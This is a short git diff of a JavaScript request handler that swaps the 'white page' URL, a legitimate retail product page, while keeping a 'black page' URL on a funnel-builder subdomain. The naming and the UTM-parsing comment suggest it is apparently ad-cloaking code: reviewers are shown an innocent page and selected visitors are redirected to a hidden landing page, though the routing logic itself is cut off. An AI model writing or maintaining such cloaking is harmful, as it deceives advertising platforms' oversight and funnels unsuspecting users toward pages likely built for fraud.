@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.lowes.com.au/shop-all/accessories/socks/m-traders-2-pack-novelty-christmas-business-socks-53929";
+    const whitePageURL = "https://au.brixton.com/collections/mens-knit-tops/products/vintage-reserve-s-s-henley-black-sol-wash?cid=plp_collection-id=275015532698_collection-title=Mens-Knit-Tops_collection-index=0";
     const blackPageURL = "https://qkoyuipdyy.myfunnelish.com/imbassd-1735569750458492";
   
     // Parse the UTM parameters from the request URL
